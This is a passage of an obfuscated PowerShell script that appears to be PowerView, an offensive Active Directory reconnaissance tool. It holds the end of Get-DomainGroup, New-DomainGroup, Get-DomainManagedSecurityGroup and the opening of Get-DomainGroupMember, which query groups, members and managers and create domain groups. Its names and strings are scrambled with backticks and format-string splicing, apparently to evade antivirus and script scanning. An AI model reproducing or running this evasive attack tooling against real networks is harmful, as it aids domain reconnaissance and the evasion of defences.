        if (${psBO`UNdpA`RaMe`T`erS}[("{1}{2}{0}" -f 'ies','Prop','ert')]) { ${seaRCHeRA`R`g`UME`NTs}[("{1}{2}{0}" -f 'es','Pro','perti')] = ${pRo`pE`Rti`Es} }
        if (${pS`BoUnDPaR`A`M`EtErs}[("{0}{2}{3}{1}"-f 'S','Base','ea','rch')]) { ${S`E`AR`ChErarguMEN`Ts}[("{0}{2}{1}"-f 'Sear','ase','chB')] = ${sEARc`H`BA`se} }
        if (${psBoUnd`pArAm`e`TeRs}[("{1}{0}"-f'er','Serv')]) { ${se`ARc`HEr`Argu`MEnts}[("{0}{2}{1}"-f'S','r','erve')] = ${s`ERveR} }
        if (${PsBouND`PArAMe`T`ErS}[("{1}{2}{0}" -f 'hScope','Se','arc')]) { ${sEa`RCH`eRa`R`GUMeNtS}[("{1}{0}{2}" -f 'rchSc','Sea','ope')] = ${S`EaR`CHSc`OPe} }
        if (${pSbo`UnDPa`R`AM`EtErs}[("{3}{1}{0}{2}"-f 'eSiz','ltPag','e','Resu')]) { ${sE`ArcHE`R`ARGuMenTs}[("{1}{3}{2}{0}"-f 'e','ResultPa','eSiz','g')] = ${R`ES`UltpagesiZe} }
        if (${pSB`OUnd`PA`RAm`ET`ErS}[("{0}{1}{4}{2}{3}"-f 'Server','T','eLim','it','im')]) { ${Se`ARchE`RA`RGU`MEN`TS}[("{2}{1}{0}{3}" -f'im','meL','ServerTi','it')] = ${se`RVE`Rt`ImelIMit} }
        if (${PS`BOUNdparAm`eTe`Rs}[("{2}{1}{0}{3}"-f'tyMask','ri','Secu','s')]) { ${S`eArcheRA`RguMEN`Ts}[("{3}{1}{0}{2}" -f 'a','M','sks','Security')] = ${sEC`UrITy`m`ASKS} }
        if (${PSBOUND`p`Ara`MET`ErS}[("{1}{0}" -f 'stone','Tomb')]) { ${S`eaRc`h`eRAr`g`UMEnTs}[("{1}{0}{2}{3}"-f'ombsto','T','n','e')] = ${tOMb`st`ONE} }
        if (${PSb`OUnd`PaRaMetE`Rs}[("{0}{2}{1}{3}"-f'Cre','entia','d','l')]) { ${S`EaR`CH`erArGU`MeNTS}[("{3}{0}{2}{1}"-f'de','al','nti','Cre')] = ${cR`e`dE`NTIAl} }
        ${G`ROups`e`ARCH`er} = &("{0}{2}{3}{1}"-f'Get-Domain','cher','Sea','r') @SearcherArguments
    }

    PROCESS {
        if (${Gro`UpsE`Ar`chER}) {
            if (${ps`BoUnDPa`RA`M`eTerS}[("{0}{3}{2}{1}"-f 'M','tity','mberIden','e')]) {

                if (${sEa`R`chEr`A`Rg`UmeNtS}[("{3}{0}{1}{2}" -f'p','ertie','s','Pro')]) {
                    ${O`l`d`ProP`eRTieS} = ${sEARChER`Ar`g`UmEnTS}[("{0}{3}{1}{2}" -f'P','er','ties','rop')]
                }

                ${sE`A`Rc`HerARguM`E`NTS}[("{0}{1}{2}"-f'Ident','it','y')] = ${MEm`BeR`i`dEnTITy}
                ${SEar`c`hErargU`men`Ts}['Raw'] = ${tR`Ue}

                &("{3}{0}{4}{2}{1}"-f 'D','bject','inO','Get-','oma') @SearcherArguments | &("{3}{2}{1}{0}"-f'-Object','Each','r','Fo') {
                    
                    ${OB`jEct`diRec`TOR`yen`TRy} = ${_}.("{1}{3}{0}{2}" -f 'yE','GetDire','ntry','ctor').Invoke()

                    
                    ${obje`cTdiRe`c`T`orYeNtry}.("{0}{2}{1}" -f'Refres','Cache','h').Invoke(("{1}{2}{0}" -f 's','tokenGr','oup'))

                    ${ObJ`e`Ctdir`eCtOr`Ye`NTry}."tOkEnG`RoU`ps" | &("{2}{0}{3}{1}{4}" -f 'orEach','Objec','F','-','t') {
                        
                        ${G`R`oupSid} = (&("{0}{1}{2}"-f 'New-O','bje','ct') ("{4}{5}{6}{2}{1}{7}{0}{3}" -f 'Iden','curi','e','tifier','System.Security.Pr','in','cipal.S','ty')(${_},0))."v`AlUe"

                        
                        if (${Gr`oupS`id} -notmatch ("{2}{1}{0}"-f '-5-32-.*','S-1','^')) {
                            ${SEARche`R`Arg`UMEN`TS}[("{1}{0}{2}"-f 'e','Id','ntity')] = ${gROu`psid}
                            ${sEAR`cH`er`A`Rgu`meNts}['Raw'] = ${fa`lse}
                            if (${ol`DPr`O`PERTiEs}) { ${SeaRCherA`R`gUMe`N`TS}[("{0}{1}{2}" -f'Pro','pertie','s')] = ${Old`pRop`E`RT`IEs} }
                            ${GRO`UP} = &("{1}{2}{3}{0}" -f 'ject','Get-Dom','ai','nOb') @SearcherArguments
                            if (${GR`O`Up}) {
                                ${gR`O`Up}."Ps`O`BjECT"."T`ypeN`AMES".("{0}{1}" -f'I','nsert').Invoke(0, ("{0}{1}{3}{2}"-f 'Po','w','Group','erView.'))
                                ${G`RoUP}
                            }
                        }
                    }
                }
            }
            else {
                ${IdE`Nti`Tyf`Ilt`er} = ''
                ${F`Ilt`eR} = ''
                ${i`de`NtI`Ty} | &("{3}{1}{0}{2}"-f 'bjec','here-O','t','W') {${_}} | &("{1}{3}{0}{2}"-f 'Each-','F','Object','or') {
                    ${IDe`Nti`T`YINs`Ta`NCe} = ${_}.("{2}{0}{1}"-f'epl','ace','R').Invoke('(', '\28').("{1}{0}" -f'eplace','R').Invoke(')', '\29')
                    if (${id`ENt`It`yi`NS`TANcE} -match ("{0}{1}" -f'^S','-1-')) {
                        ${id`eNtITYf`I`LtER} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${Ide`N`TitYi`NstANCE} -match ("{1}{0}"-f'N=','^C')) {
                        ${Id`eN`T`iT`yFiltER} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${pSbo`UndPaRAME`T`E`Rs}[("{0}{1}" -f'Do','main')]) -and (-not ${psbOUN`DpA`Ram`eTeRs}[("{1}{2}{0}" -f'e','SearchB','as')])) {
                            
                            
                            ${IDeN`TiT`yd`om`AIN} = ${i`dEnT`ityI`N`s`TANCe}.("{3}{2}{0}{1}" -f'rin','g','t','SubS').Invoke(${IDEntiTyI`N`sTAn`Ce}.("{0}{1}"-f'IndexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{2}{3}{0}{1}"-f 'er','bose','Wr','ite-V') ('['+'Get-'+'Do'+'mainG'+'roup] '+'Extrac'+'ted'+' '+'domai'+'n'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${SeAR`cHE`Ra`RguMeN`Ts}[("{2}{1}{0}" -f'n','i','Doma')] = ${iD`EnTitYd`OMA`IN}
                            ${gRou`P`S`eaRcHEr} = &("{1}{0}{4}{2}{3}"-f 'm','Get-Do','arch','er','ainSe') @SearcherArguments
                            if (-not ${GrOuPS`E`Arc`Her}) {
                                &("{2}{3}{0}{1}" -f 'a','rning','Write','-W') ('['+'Ge'+'t-'+'D'+'omainGrou'+'p] '+'Un'+'able '+'to'+' '+'retrie'+'v'+'e '+'do'+'main'+' '+'sea'+'rcher'+' '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IdEntIt`YINS`Ta`Nce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GuI`DBY`TeS`TR`InG} = (([Guid]${I`dEn`TIt`YInstaNce}).("{2}{0}{1}"-f 'By','teArray','To').Invoke() | &("{0}{4}{2}{1}{3}" -f 'For','ch','a','-Object','E') { '\' + ${_}.("{2}{1}{0}" -f'g','Strin','To').Invoke('X2') }) -join ''
                        ${iDeN`T`iTYfILtEr} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${iDE`NTI`T`Y`iNsT`ANce}.("{1}{0}" -f 'ains','Cont').Invoke('\')) {
                        ${cOnv`E`RteD`identiTyINSt`A`NCE} = ${iD`eNtI`TYi`NsTANCe}.("{0}{1}"-f'Repl','ace').Invoke('\28', '(').("{1}{0}"-f 'ace','Repl').Invoke('\29', ')') | &("{2}{0}{1}" -f'vert','-ADName','Con') -OutputType ("{2}{0}{1}" -f 'non','ical','Ca')
                        if (${ConvE`R`T`EdideNTityinst`A`N`ce}) {
                            ${GrOuP`D`o`main} = ${conv`eR`TED`iDEntITYInsT`AnCE}.("{0}{1}{2}" -f 'S','ubS','tring').Invoke(0, ${CONv`E`Rt`edIDENTI`T`Yi`N`STanCE}.("{2}{1}{0}" -f'xOf','nde','I').Invoke('/'))
                            ${grOupN`A`me} = ${IDent`ItYiNs`T`ANCe}.("{1}{0}"-f 'plit','S').Invoke('\')[1]
                            ${iD`ENt`itYFILter} += "(samAccountName=$GroupName)"
                            ${se`ARchE`RAR`GUmen`Ts}[("{2}{0}{1}" -f'a','in','Dom')] = ${g`RoupDO`MAiN}
                            &("{2}{0}{3}{1}"-f'Verb','se','Write-','o') ('['+'Get-D'+'oma'+'inGr'+'ou'+'p] '+'Extr'+'acte'+'d '+'d'+'om'+'ain '+"'$GroupDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${g`ROu`Pse`ARCHeR} = &("{1}{4}{2}{0}{3}" -f 'ar','Get-Doma','e','cher','inS') @SearcherArguments
                        }
                    }
                    else {
                        ${iDENTi`T`YFilT`er} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${i`de`NTitYfIl`T`eR} -and (${i`d`eNtITY`FILtEr}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                    ${Fi`Lt`eR} += "(|$IdentityFilter)"
                }

                if (${pSBOU`Nd`P`ARa`mEteRS}[("{2}{1}{0}"-f'ount','nC','Admi')]) {
                    &("{0}{1}{3}{2}"-f 'W','rite-V','se','erbo') ("{5}{4}{1}{8}{6}{10}{7}{9}{3}{2}{11}{0}" -f'nCount=1','nGroup','m','r ad','Domai','[Get-',' S','ng ',']','fo','earchi','i')
                    ${f`ILteR} += ("{0}{2}{3}{1}" -f'(adm','t=1)','inco','un')
                }
                if (${PSBoU`N`dPA`R`AMETErS}[("{1}{0}{2}"-f'pS','Grou','cope')]) {
                    ${gr`oUp`scop`EV`Alue} = ${P`SBou`NDpARAm`ET`e`Rs}[("{0}{2}{3}{1}"-f 'Gro','pe','u','pSco')]
                    ${fil`T`ER} = Switch (${gRO`Upsc`opEv`A`lUE}) {
                        ("{2}{1}{0}{3}"-f 'n','omai','D','Local')       { (("{9}{2}{6}{5}{3}{0}{7}{8}{1}{4}"-f '6',':','upType:','5','=4)','40.1135','1.2.8','.1.4','.803','(gro')) }
                        ("{2}{1}{0}{3}" -f 'Domain','t','No','Local')    { ("{0}{6}{1}{2}{5}{7}{4}{3}"-f '(!(g','y','pe:1','1.4.803:=4))','113556.','.2.84','roupT','0.') }
                        ("{1}{0}" -f'obal','Gl')            { ("{3}{4}{1}{0}{5}{2}{6}{7}" -f 'pe:1.2','Ty','0.113556.1','(g','roup','.84','.4.803',':=2)') }
                        ("{1}{2}{0}" -f 'tGlobal','N','o')         { (("{8}{9}{7}{5}{3}{4}{11}{6}{10}{1}{0}{2}{12}" -f'.','.4','803:=2)','.','840.113','.2','.','Type:1','(','!(group','1','556',')')) }
                        ("{2}{1}{0}"-f'l','versa','Uni')         { (("{7}{3}{2}{0}{1}{4}{6}{8}{5}" -f 'e:1.2.','840.1135','Typ','group','56.1.4.803','8)',':','(','=')) }
                        ("{0}{2}{3}{1}" -f'Not','sal','Unive','r')      { ((("{5}{2}{1}{6}{0}{7}{8}{3}{4}"-f'5','.11','.2.840',')',')','(!(groupType:1','35','6.1.','4.803:=8'))) }
                    }
                    &("{3}{0}{2}{1}{4}" -f 'rite-Ve','o','rb','W','se') ('[Get-D'+'omainG'+'ro'+'up'+'] '+'Sea'+'rchi'+'ng '+'fo'+'r '+'group'+' '+'scope'+' '+"'$GroupScopeValue'")
                }
                if (${pSB`o`UNDp`ARAmet`ErS}[("{3}{1}{2}{0}"-f'y','Prop','ert','Group')]) {
                    ${g`RO`U`pPROpeRtY`Value} = ${Ps`B`OuND`PARAMETers}[("{0}{2}{1}" -f 'Grou','operty','pPr')]
                    ${F`IL`TER} = Switch (${gr`oU`P`prOPe`RT`yvAlUe}) {
                        ("{1}{0}{2}" -f 'r','Secu','ity')              { ("{5}{3}{9}{0}{4}{7}{1}{2}{8}{6}" -f'upTy','4','.803:=','r','pe:1.2.8','(g','7483648)','40.113556.1.','214','o') }
                        ("{3}{0}{2}{1}"-f 'tri','n','butio','Dis')          { ("{6}{9}{2}{1}{4}{3}{5}{0}{8}{7}"-f '36','56','135','.4.','.1','803:=214748','(!(gr','8))','4','oupType:1.2.840.1') }
                        ("{1}{3}{2}{0}" -f 'm','CreatedB','ste','ySy')       { ("{0}{7}{4}{6}{2}{1}{3}{5}"-f'(','2.840.1','Type:1.','135','o','56.1.4.803:=1)','up','gr') }
                        ("{0}{2}{1}{3}"-f'NotCrea','dBy','te','System')    { ("{0}{2}{1}{8}{9}{7}{4}{6}{5}{3}"-f'(','(gro','!',':=1))','556.','03','1.4.8','.113','upType:1.2.','840') }
                    }
                    &("{1}{2}{0}{4}{3}"-f 'ite-V','W','r','e','erbos') ('[Ge'+'t'+'-D'+'omainGroup'+'] '+'Se'+'ar'+'ching '+'for'+' '+'g'+'roup '+'p'+'roper'+'ty '+"'$GroupPropertyValue'")
                }
                if (${P`sb`oUNdPAramEt`e`RS}[("{2}{0}{1}"-f'D','APFilter','L')]) {
                    &("{1}{2}{0}{3}"-f'-','Writ','e','Verbose') ('[G'+'e'+'t-D'+'omain'+'G'+'roup] '+'Using'+' '+'addi'+'tio'+'nal '+'LD'+'AP '+'fil'+'ter:'+' '+"$LDAPFilter")
                    ${F`iLter} += "$LDAPFilter"
                }

                ${GR`oUpse`A`RCHeR}."fi`ltER" = "(&(objectCategory=group)$Filter)"
                &("{0}{4}{2}{3}{1}"-f 'W','bose','e','-Ver','rit') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if (${ps`BoUNDpaRa`mEt`erS}[("{1}{0}"-f'One','Find')]) { ${R`eSUL`Ts} = ${g`Ro`UpSeaRcH`eR}.("{0}{1}{2}"-f'Fi','ndO','ne').Invoke() }
                else { ${rE`SUL`Ts} = ${groU`psE`A`R`chER}.("{0}{1}"-f'Fin','dAll').Invoke() }
                ${re`Su`ltS} | &("{1}{0}{2}" -f 'jec','Where-Ob','t') {${_}} | &("{2}{3}{0}{4}{1}" -f 'Obj','t','F','orEach-','ec') {
                    if (${P`S`BoUnDPARamEt`E`RS}['Raw']) {
                        
                        ${GR`O`Up} = ${_}
                    }
                    else {
                        ${g`R`OUP} = &("{4}{0}{2}{1}{3}" -f 'nvert','Prope','-LDAP','rty','Co') -Properties ${_}."PROpE`Rt`IeS"
                    }
                    ${Gro`UP}."pSO`B`jEct"."TyPEnA`m`eS".("{1}{0}"-f't','Inser').Invoke(0, ("{1}{0}{4}{2}{3}" -f 'w','Po','rView.Gr','oup','e'))
                    ${g`RO`Up}
                }
                if (${rES`UlTS}) {
                    try { ${re`Sul`Ts}.("{1}{0}" -f'e','dispos').Invoke() }
                    catch {
                        &("{1}{2}{0}{3}"-f'-V','Wri','te','erbose') ("{6}{0}{1}{5}{3}{7}{9}{2}{4}{8}"-f 'disp','os',' ob',' o','j','ing','[Get-DomainGroup] Error ','f the Resu','ect','lts')
                    }
                }
                ${G`R`oUPSEarc`h`ER}.("{0}{1}"-f'dis','pose').Invoke()
            }
        }
    }
}


function Ne`W`-D`OmAiNGROUP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{5}{9}{6}{10}{12}{8}{7}{0}{1}{2}{11}" -f 'n','gingF','un','PSUseS','ho','uldP','ce','eCha','rStat','ro','ss','ctions','Fo'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}"-f 'Pr','ess','oc','PSShould'}, '')]
    [OutputType({"{7}{1}{2}{3}{6}{0}{4}{8}{5}"-f'up','ecto','ryServices.Accou','ntManagement.','Prin','l','Gro','Dir','cipa'})]
    Param(
        [Parameter(MAnDaTOrY = ${t`Rue})]
        [ValidateLength(0, 256)]
        [String]
        ${sAMacC`oUntN`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${nA`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DiSP`LaYN`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dE`scRIpt`ion},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAin},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crED`en`Ti`AL} =  ( &("{0}{2}{1}"-f 'V','BLE','aRia')  ("5r0"+"vK") )."val`UE"::"emP`TY"
    )

    ${cOn`T`EXTArGu`MeNTs} = @{
        ("{2}{0}{1}"-f 'denti','ty','I') = ${sA`mAcCoUn`T`NA`mE}
    }
    if (${p`sboU`NdpA`R`AMEtERS}[("{0}{1}" -f 'Do','main')]) { ${co`NTextAR`GUM`eNtS}[("{1}{0}" -f 'omain','D')] = ${d`oma`in} }
    if (${P`Sb`oUn`DpArAM`et`ErS}[("{2}{0}{1}" -f're','dential','C')]) { ${COnTexTa`R`guM`enTs}[("{1}{2}{0}"-f'dential','C','re')] = ${C`Red`eNTIaL} }
    ${c`o`NTeXt} = &("{2}{4}{3}{0}{1}" -f 'alCont','ext','Get-P','ncip','ri') @ContextArguments

    if (${cO`Nt`eXT}) {
        ${g`ROup} = &("{2}{0}{1}" -f'w-Obj','ect','Ne') -TypeName ("{4}{1}{5}{11}{6}{7}{0}{8}{10}{9}{3}{2}" -f 'em','ctoryServices','pPrincipal','.Grou','System.Dire','.','u','ntManag','e','t','n','Acco') -ArgumentList (${C`ON`TexT}."COn`T`exT")

        
        ${Gr`oUP}."sAMaCC`OunT`N`AmE" = ${cON`T`ExT}."i`DenT`ity"

        if (${PSBo`UNDP`ARameT`ERS}[("{0}{1}"-f 'N','ame')]) {
            ${G`RO`Up}."na`Me" = ${n`AMe}
        }
        else {
            ${grO`Up}."N`AME" = ${c`onTExT}."I`DEN`TitY"
        }
        if (${P`sBOUnD`PaRa`m`eterS}[("{2}{1}{3}{0}"-f 'me','isplayN','D','a')]) {
            ${G`R`ouP}."D`Isp`lA`yNAmE" = ${d`iSplA`yNaME}
        }
        else {
            ${g`ROuP}."D`IsP`La`YNaME" = ${c`O`NText}."i`dentI`TY"
        }

        if (${PSBOuN`d`pa`RAM`Ete`RS}[("{1}{3}{0}{2}" -f'ri','Des','ption','c')]) {
            ${gr`Oup}."descRI`Pti`oN" = ${D`Escr`IPtI`on}
        }

        &("{4}{0}{2}{1}{3}"-f'rite','erb','-V','ose','W') ('[New-DomainG'+'r'+'o'+'up] '+'At'+'temp'+'ting'+' '+'t'+'o '+'crea'+'t'+'e '+'gro'+'u'+'p '+"'$SamAccountName'")
        try {
            ${n`UlL} = ${g`ROuP}.("{1}{0}" -f've','Sa').Invoke()
            &("{2}{3}{4}{1}{0}" -f'bose','r','Wri','te-','Ve') ('[New-Domai'+'nGroup'+']'+' '+'Grou'+'p '+"'$SamAccountName' "+'su'+'c'+'cessfully'+' '+'c'+'rea'+'ted')
            ${g`ROUp}
        }
        catch {
            &("{2}{0}{1}" -f 'te-Warn','ing','Wri') ('[New-Dom'+'ain'+'Gr'+'oup'+']'+' '+'Erro'+'r '+'creati'+'ng'+' '+'grou'+'p '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function gET-`domAiNmANAgEDseCUrit`YG`RO`Up {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f'PSS','houldPro','ess','c'}, '')]
    [OutputType({"{6}{2}{3}{0}{5}{1}{4}" -f'ge','urity','w','erView.Mana','Group','dSec','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitION = 0, ValuEFROMPIPElInE = ${t`RUe}, vALuEfrOmPIpElINEByPrOpeRtyNamE = ${t`RUE})]
        [Alias({"{0}{1}"-f 'Nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'DSPath','A'})]
        [String]
        ${s`eArCHbA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{1}{2}{0}" -f'er','ro','ll','nCont','Domai'})]
        [String]
        ${SeR`V`ER},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{1}{0}"-f'vel','OneLe'}, {"{0}{2}{1}" -f 'S','tree','ub'})]
        [String]
        ${s`EaRc`hs`CoPE} = ("{1}{0}" -f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsu`LtpA`g`EsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRvE`RtI`M`eliMIt},

        [Switch]
        ${tomBSt`o`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`enti`Al} =   ( &("{2}{1}{0}"-f 'Ble','a','VARI')  ("{0}{1}"-f'5R','0Vk') -vALUEONLy  )::"eM`PTy"
    )

    BEGIN {
        ${se`ARche`RaR`gUmEn`TS} = @{
            ("{0}{1}{3}{2}"-f'LD','APF','r','ilte') = (("{10}{7}{2}{8}{6}{12}{9}{5}{1}{11}{3}{13}{4}{0}{14}" -f '48','.4','roupTyp','803','836','1',':1.2.8','dBy=*)(g','e','6.','(&(manage','.','40.11355',':=21474','))'))
            ("{2}{1}{0}" -f's','rtie','Prope') = ("{10}{3}{2}{5}{13}{0}{14}{12}{6}{11}{4}{1}{9}{7}{15}{8}"-f',ma','p','tingu','s','untty','ishedN','s','sa','me','e,','di','amacco',',','ame','nagedBy','maccountna')
        }
        if (${PSboUn`d`P`ARaMetE`Rs}[("{2}{0}{1}" -f'arch','Base','Se')]) { ${se`ArC`He`RARG`U`MeNTs}[("{0}{2}{1}"-f 'S','rchBase','ea')] = ${sEA`RCh`B`AsE} }
        if (${pSb`OUN`DpaRAme`T`e`Rs}[("{0}{1}"-f'Serve','r')]) { ${SE`Ar`C`HeRaRg`UM`enTS}[("{2}{1}{0}"-f'rver','e','S')] = ${SE`RV`Er} }
        if (${P`S`B`ounDPa`RAMet`erS}[("{3}{0}{2}{1}" -f'ear','ope','chSc','S')]) { ${Sea`RCheR`ArGumEN`Ts}[("{0}{2}{1}" -f 'Sea','cope','rchS')] = ${S`earcHS`Co`PE} }
        if (${Ps`BOUNd`P`A`RAmEteRS}[("{3}{2}{0}{1}" -f'ultPa','geSize','s','Re')]) { ${SE`A`RChErarGU`m`E`NTs}[("{3}{0}{2}{1}"-f 'eSi','e','z','ResultPag')] = ${R`E`Su`lTPAGESi`ZE} }
        if (${p`sBoU`Ndp`A`Ra`MetERs}[("{2}{0}{3}{4}{1}" -f 'er','imit','S','v','erTimeL')]) { ${Sea`RCHER`ARg`UMeNts}[("{1}{0}{2}{3}"-f 'erverTi','S','meLim','it')] = ${ServeR`T`IM`eLiMIt} }
        if (${PSb`OU`ND`pa`RAM`EtErS}[("{1}{2}{3}{0}"-f'asks','Se','curi','tyM')]) { ${SE`Ar`c`HER`ArguME`NTs}[("{2}{1}{3}{0}"-f's','ityM','Secur','ask')] = ${s`Ec`U`RItymAsKs} }
        if (${P`sb`oUnD`p`ARAmeTERS}[("{1}{0}{2}" -f'mbst','To','one')]) { ${S`EAr`cheRarG`Umen`Ts}[("{0}{2}{1}"-f 'Tom','e','bston')] = ${T`omb`sTOne} }
        if (${Psb`ouNDpa`Ra`me`TeRs}[("{1}{0}{2}" -f 're','C','dential')]) { ${sEAR`cH`eRArGuM`enTS}[("{1}{2}{0}" -f 'l','Credenti','a')] = ${c`R`EDEntial} }
    }

    PROCESS {
        if (${p`sBOUNdPA`RA`mEt`ers}[("{1}{0}"-f 'ain','Dom')]) {
            ${S`E`ARChERA`RGUMENts}[("{1}{2}{0}" -f 'n','Dom','ai')] = ${do`Ma`In}
            ${ta`RgE`Tdo`MAIn} = ${DoM`A`in}
        }
        else {
            ${T`ARgEt`dOmaIn} = ${EN`V:U`seRdnsDoMa`IN}
        }

        
        &("{2}{3}{0}{1}"-f 'omain','Group','G','et-D') @SearcherArguments | &("{1}{2}{0}" -f 'ect','ForEach-','Obj') {
            ${sea`R`C`H`Erar`gUmEnTS}[("{0}{2}{1}{3}" -f'Prop','tie','er','s')] = ("{1}{7}{2}{0}{8}{6}{9}{3}{4}{5}" -f 'me,s','di','na','samacc','ou','ntname,objectsid','ac','stinguishedname,','am','counttype,')
            ${s`E`A`Rc`HERaRGuMenTs}[("{1}{0}{2}" -f 'denti','I','ty')] = ${_}."m`ANA`gedBy"
            ${NU`LL} = ${S`EARCH`EraRGu`M`EnTs}.("{0}{2}{1}"-f'Re','ve','mo').Invoke(("{1}{2}{0}{3}"-f 'F','LDA','P','ilter'))

            
            
            ${G`RoUpmaN`AGer} = &("{1}{2}{3}{4}{0}" -f'ect','G','et-Domain','O','bj') @SearcherArguments
            
            ${manaGE`D`gR`oUP} = &("{3}{0}{2}{1}" -f'b','ct','je','New-O') ("{2}{1}{0}" -f'ect','SObj','P')
            ${mA`NAgEDG`Ro`UP} | &("{0}{2}{1}"-f 'Add-Memb','r','e') ("{0}{3}{1}{2}" -f 'N','rope','rty','otep') ("{2}{1}{0}" -f'me','roupNa','G') ${_}."saMa`C`CountnAMe"
            ${Ma`Na`GedGR`OuP} | &("{1}{0}{2}"-f'e','Add-Memb','r') ("{2}{1}{0}{3}"-f 'ro','ep','Not','perty') ("{1}{2}{3}{0}{4}" -f 'dN','Gr','oupDis','tinguishe','ame') ${_}."dIStinGUis`hed`N`AME"
            ${man`AgeDgR`OuP} | &("{0}{1}{2}"-f'Add','-Memb','er') ("{3}{2}{1}{0}"-f 'ty','per','o','Notepr') ("{0}{1}{2}"-f 'Manage','r','Name') ${GRO`UP`ma`NaG`eR}."S`A`MACCounTN`AME"
            ${mAN`AGe`Dg`R`OuP} | &("{1}{2}{0}" -f 'r','Add-Me','mbe') ("{2}{1}{0}{3}"-f 'rt','eprope','Not','y') ("{6}{3}{0}{4}{5}{1}{2}"-f 'rD','nguishe','dName','anage','ist','i','M') ${g`ROup`MANaGEr}."D`iSTIngUIshE`DNa`ME"

            
            if (${GrOU`Pman`A`Ger}."sAM`Ac`CO`UNt`TYpe" -eq 0x10000000) {
                ${mAN`A`gED`gR`OuP} | &("{1}{2}{0}" -f'er','Add-Me','mb') ("{0}{1}{2}"-f 'N','oteprop','erty') ("{3}{2}{1}{0}" -f'Type','er','nag','Ma') ("{0}{1}"-f 'G','roup')
            }
            elseif (${GROupm`A`Na`GER}."Sa`maccO`UnT`TypE" -eq 0x30000000) {
                ${MAn`AgEDg`Roup} | &("{1}{2}{0}"-f 'ember','A','dd-M') ("{0}{2}{3}{1}" -f'Notepro','y','per','t') ("{1}{2}{0}"-f 'Type','Man','ager') ("{0}{1}" -f'U','ser')
            }

            ${AcLAr`GuM`EntS} = @{
                ("{1}{0}" -f 'entity','Id') = ${_}."dISTingU`IshE`DN`AmE"
                ("{2}{1}{0}" -f 'ter','ghtsFil','Ri') = ("{2}{0}{1}" -f'M','embers','Write')
            }
            if (${PsboUN`d`paRAM`eTe`RS}[("{1}{2}{0}"-f 'rver','S','e')]) { ${a`CLa`R`g`UmENTs}[("{1}{0}"-f 'ver','Ser')] = ${SER`V`eR} }
            if (${PSbO`UN`Dpa`R`A`METerS}[("{1}{2}{0}"-f 'pe','SearchSc','o')]) { ${acLAR`G`UM`E`NTS}[("{2}{0}{1}" -f'c','hScope','Sear')] = ${Sea`RCh`SC`opE} }
            if (${PsbO`U`NDPaRA`MeTE`RS}[("{1}{0}{2}{3}"-f 'ltP','Resu','ageSi','ze')]) { ${A`clA`RGuMenTs}[("{2}{3}{0}{1}"-f 'Pag','eSize','Re','sult')] = ${ResuLtpag`E`S`IzE} }
            if (${pSB`oU`Nd`p`ARAMET`ERS}[("{2}{1}{3}{0}"-f 'mit','Time','Server','Li')]) { ${Ac`lAr`GumE`NTS}[("{3}{1}{0}{2}{4}" -f'TimeL','r','im','Serve','it')] = ${servE`RTi`M`eLI`miT} }
            if (${pSBoUNdPAr`A`met`eRS}[("{1}{0}{2}" -f'bs','Tom','tone')]) { ${AClARGU`ME`NtS}[("{1}{0}{2}" -f'o','Tombst','ne')] = ${t`OmBsTO`Ne} }
            if (${p`sBOUnd`p`ArAmE`TeRS}[("{2}{3}{1}{0}" -f 'ial','dent','C','re')]) { ${a`cL`ARGu`m`eNts}[("{0}{2}{1}"-f 'Credenti','l','a')] = ${crEd`enti`Al} }

            
            
            
            
            
            
            
            
            
            
            

            ${M`A`NAgeDGROup} | &("{2}{0}{1}" -f 'd','d-Member','A') ("{0}{1}{3}{2}" -f'N','otepro','y','pert') ("{1}{3}{0}{2}{4}" -f'anWr','Mana','it','gerC','e') ("{1}{0}" -f'KNOWN','UN')

            ${maNA`G`ed`gro`UP}."p`SO`BjECt"."tY`p`EnAmES".("{2}{0}{1}" -f's','ert','In').Invoke(0, ("{5}{6}{7}{0}{3}{2}{1}{4}{8}"-f 'ie','tyGr','anagedSecuri','w.M','o','Powe','r','V','up'))
            ${maNa`GedG`ROUp}
        }
    }
}


function G`ET-d`oMAIngROupM`eMBEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}" -f 'o','PSSh','uldProcess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{6}{3}{0}{5}{7}{4}{8}{2}" -f 'a','PSUse','ents','eclaredV','eThanAss','r','D','sMor','ignm'}, '')]
    [OutputType({"{2}{1}{5}{4}{0}{3}" -f'oupM','werView.','Po','ember','r','G'})]
    [CmdletBinding(dEfAULTPARaMeTERSeTNamE = {"{0}{1}" -f'No','ne'})]
    Param(
